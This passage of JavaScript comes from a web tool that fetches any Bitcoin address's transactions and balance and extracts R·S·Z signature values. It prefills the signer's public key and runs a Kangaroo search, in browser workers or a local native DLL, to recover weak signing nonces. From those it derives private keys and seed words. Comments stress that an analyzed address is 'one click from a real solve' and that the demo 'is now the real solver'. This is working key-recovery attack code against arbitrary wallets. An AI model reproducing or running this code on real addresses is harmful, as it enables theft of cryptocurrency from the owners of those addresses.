                nativeHintBox(startHex, endHex, pub);
            return;
        }
        var sqrtApprox = Math.pow(2, bits / 2), budgetMul = 8;
        var expected = Math.max(2000, budgetMul * sqrtApprox);
        var globalBudget = Math.min(300000000, Math.ceil(budgetMul * sqrtApprox * 3) + 4000);
        if (live) live.set({ engine: 'js', state: 'starting', cores: kangarooCores(), pct: 0,
            pub: pub, startHex: startHex, endHex: endHex, scanStart: startHex, scanEnd: endHex });
        out.innerHTML = header + (fallbackNote ? '<div class="rsz-leak-note">' + fallbackNote + '</div>' : '') + solveIntro(ctx);

        var res = await runSolveJS({ pub: pub, startHex: startHex, endHex: endHex, budgetMul: budgetMul, globalBudget: globalBudget }, function (fr) {
            if (!live || !fr) return;
            fr.pct = expected > 0 ? (fr.hops / expected) * 100 : null;
            live.set(fr);
        });
        if (!res || res.__noWorker) {
            if (live) live.done(false, 'unavailable');
            out.innerHTML = header + (fallbackNote ? '<div class="rsz-leak-note">' + fallbackNote + '</div>' : '') + errBox('Web Workers are unavailable here, so the in-page engine can’t run. Use the native kgaroocgtegein engine on your PC.');
            return;
        }
        var ok = !!(res.ok && res.privHex);
        if (live) live.done(ok, ok ? 'FOUND' : (res.exhausted ? 'budget hit' : 'not found'));
        out.innerHTML = header + (fallbackNote ? '<div class="rsz-leak-note">' + fallbackNote + '</div>' : '') + renderSolve(res, ctx, addrFor(pub));
    }

    // ---- Search-range control -------------------------------------------
    function readBits() {
        const el = document.getElementById('ds-bits');
        let b = el ? parseInt(el.value, 10) : 24;
        if (!b || b < 8) b = 8;
        if (b > 44) b = 44;
        return b;
    }

    // After an on-chain scan, drop the signer's public key + a starting keyspace
    // into the Kangaroo key-solver inputs, so an analyzed address is one click
    // from a real solve. The public key is the address's on-chain signing key;
    // the range is a copyable 1 : 2^bits-1 scaffold (from the scan-range control)
    // the user can widen before Solve. The pubkey always refreshes to the newly
    // analyzed one; the range only fills when empty, so a hand-set keyspace stays.
    function prefillSolverFromScan(rsz, input, mode, bits) {
        if (!rsz || !rsz.length) return;
        var pubEl = document.getElementById('ds-pub');
        var rangeEl = document.getElementById('ds-range');
        if (!pubEl && !rangeEl) return;
        // Prefer the analyzed address's own signer; otherwise the first signer.
        var pick = null;
        if (mode === 'address') {
            for (var i = 0; i < rsz.length; i++) { if (rsz[i].addr === input) { pick = rsz[i]; break; } }
        }
        if (!pick) pick = rsz[0];
        var pub = (pick && pick.pub) ? pick.pub : '';
        if (!pub) return;                                  // no pubkey revealed on-chain
        if (pubEl) pubEl.value = pub;
        if (rangeEl && !rangeEl.value.trim()) {
            rangeEl.value = '1:' + ((1n << BigInt(bits)) - 1n).toString(16);
        }
    }

    // ---- Main entry: on-chain scan ---------------------------------------
    async function processTxid() {
        const input = document.getElementById("txid_input").value.trim();
        const out = document.getElementById("out_txid");
        if (!input) return;

        const limitEl = document.getElementById("txr-tx-limit");
        let want = limitEl ? parseInt(limitEl.value, 10) : 100;
        if (!want || want < 1) want = 100;

        const bits = readBits();
        const header = getOutputHeader(out.id);
        const setStatus = function (msg) {
            out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
        };
        const onProgress = function (p) {
            if (p.phase === 'list') {
                setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            } else {
                setStatus('Scanning transactions for R·S·Z… ' + p.scanned + ' / ' + p.target +
                    '  (signatures found: ' + p.found + ')');
            }
        };

        setStatus('Analyzing input (TXID or Address)…');

        try {
            let rsz = [];
            let mode = "";
            if (input.length === 64 && /^[0-9a-fA-F]+$/.test(input)) {
                mode = "txid";
                setStats(null);
                const rawtx = await getRawTx(input);
                const parsed = parsingRaw(rawtx);
                rsz = getrsz(parsed);
                rsz.forEach(function (e) { if (!e.txid) e.txid = input.toLowerCase(); });
            } else if (input.length >= 26) {
                mode = "address";
                setStatus('Fetching balance…');
                statLoading();
                try { setStats(await fetchAddressStats(input)); } catch (e) { setStats(null); }
                rsz = await resolveInputToRSZ(input, want, onProgress);
            } else {
                throw new Error("Invalid input. Paste a 64-character TXID or a Bitcoin address.");
            }

            out.innerHTML = header + renderResults(rsz, input, mode, bits);

            // Hand the recovered public key + a starting keyspace to the solver
            // inputs so the analyzed address is one click from a real Kangaroo solve.
            prefillSolverFromScan(rsz, input, mode, bits);

            // Kick off the Kangaroo scan; live speed above, verdict in #ds-box.
            // The engine toggle picks the browser worker pool ('js') or the local
            // native DLL ('native'). Native recovers each nonce on the 31-core
            // DLL — same fetch→R·S·Z→nonce→key flow — and silently falls back to
            // the browser engine if the local server isn't up.
            if (rsz && rsz.length) {
                const host = liveHost();
                const live = host ? LivePanel(host) : null;
                const useNative = readEngine() === 'native';

                // One progress handler for both engines. Native frames carry the
                // DLL's real speed/elapsed/pct; JS frames carry hop counts.
                const onProg = function (p) {
                    if (!p) return;
                    if (live) {
                        if (p.engine === 'native') {
                            var effS = nativeEff(p.keyStart, p.keyEnd, p.elapsedSec || 0);
                            live.set({
                                engine: 'native',
                                state: p.phase === 'signer' ? 'reading signer' : (p.scanning ? 'scanning' : (p.state || 'running')),
                                rate: p.keysPerSec || effS.rate,
                                rateText: (p.speed != null && p.speed !== '') ? (p.speed + ' ' + (p.unit || '') + '/s') : effS.rateText,
                                hopsText: p.count || effS.hopsText, elapsedText: p.elapsed || null, elapsed: p.elapsedSec || 0,
                                cores: p.cores, pct: (typeof p.pct === 'number' ? p.pct : null),
                                // the pubkey kangaroo actually hops is the nonce point R (server
                                // echoes it back as `pub`); the keyspace is the nonce range and
                                // `scanStart/scanEnd` is the live sub-range the DLL is on now.
                                pub: p.pub, startHex: p.keyStart, endHex: p.keyEnd,
                                scanStart: p.scanStart, scanEnd: p.scanEnd
                            });
                        } else {
                            live.set(p);
                        }
                    }
                    const b = document.getElementById('ds-box');
                    if (b) {
                        let msg;
                        if (p.phase === 'signer') {
                            msg = 'Analyzing signer ' + ((p.gi || 0) + 1) + ' / ' + (p.total || '?') +
                                (p.count ? ' (' + p.count + ' signature' + (p.count > 1 ? 's' : '') + ')' : '') + '…';
                        } else if (p.engine === 'native') {
                            msg = 'Native Kangaroo recovering nonce' + (p.sig ? ' #' + p.sig : '') +
                                ' on ' + (p.cores || '?') + ' cores' +
                                (p.speed ? ' (' + p.speed + ' ' + (p.unit || '') + '/s)' : '') + '…';
                        } else {
                            msg = 'Kangaroo hopping the 2^' + bits + ' range on ' + (p.cores || kangarooCores()) + ' cores' +
                                (p.hops ? ' (' + Math.round(p.hops).toLocaleString() + ' hops · ' + fmtRate(p.rate || p.rateAvg || 0) + ' keys/s)' : '') + '…';
                        }
                        b.innerHTML = '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
                    }
                };

                const renderDone = async function (res) {
                    let words = null;
                    if (res && res.results && res.results.some(function (r) { return r.found && r.seed; })) {
                        words = await loadWordlist();
                    }
                    if (live) {
                        if (!res || res.results === null) live.done(false, 'engine unavailable');
                        else { const f = res.results.some(function (r) { return r.found; }); live.done(f, f ? 'leak found' : 'scan complete'); }
                    }
                    const box = document.getElementById('ds-box');
                    if (box) { box.classList.remove('rsz-leak-pending'); box.innerHTML = renderScan(res, bits, words); }
                    annotateRows(rsz, res.results);
                };

                // The nonce keyspace is known up front (1 .. 2^bits-1); show it
                // immediately so Start/End/Working aren't blank while the first
                // signer's R is being reconstructed.
                var nStart = '1', nEnd = ((1n << BigInt(bits)) - 1n).toString(16);
                // Public key of the signer we're analyzing — prefer the scanned
                // address's own on-chain signing key, else the first signer found.
                // Shown right away so the dashboard's "Public key" is never blank
                // (native frames later swap in the nonce point R being hopped).
                var scanPub = '';
                for (var sp = 0; sp < rsz.length; sp++) {
                    if (mode === 'address' && rsz[sp].addr === input) { scanPub = rsz[sp].pub || ''; break; }
                }
                if (!scanPub) { for (var sp2 = 0; sp2 < rsz.length; sp2++) { if (rsz[sp2].pub) { scanPub = rsz[sp2].pub; break; } } }
                if (live) live.set({ engine: useNative ? 'native' : 'js', state: useNative ? 'connecting…' : 'scanning', cores: useNative ? '—' : kangarooCores(),
                    pub: scanPub, startHex: nStart, endHex: nEnd, scanStart: nStart, scanEnd: nEnd });

                if (useNative) {
                    runScanNative(rsz, { bits: bits, maxSigs: 6 }, onProg).then(function (res) {
                        // native offline / DLL not ready -> transparent browser fallback
                        if (res && res.results === null) {
                            if (live) live.set({ engine: 'js', state: 'scanning (native offline)', cores: kangarooCores() });
                            return runScan(rsz, { bits: bits, globalBudget: 3000000 }, onProg).then(renderDone);
                        }
                        return renderDone(res);
                    });
                } else {
                    runScan(rsz, { bits: bits, globalBudget: 3000000 }, onProg).then(renderDone);
                }
            }
        } catch (e) {
            out.innerHTML = header +
                '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    // ---- Expose globals used by inline handlers --------------------------
    window.processTxid = processTxid;
    window.darkSkippySolve = darkSkippySolve;
    window.darkSkippyDemo = darkSkippySolve;   // back-compat alias: the demo is now the real solver
    window.exportOne = exportOne;
    window.dsRefreshNative = refreshNativeStatus;
    window.dsPopulateCores = populateCoreOptions;

    // Seed the core dropdown on load with the machine's logical cores (default 4);
    // refreshNativeStatus() later widens it to the native server's count if higher.
    try { populateCoreOptions((typeof navigator !== 'undefined' && navigator.hardwareConcurrency) ? navigator.hardwareConcurrency : 4); } catch (e) { }
})();
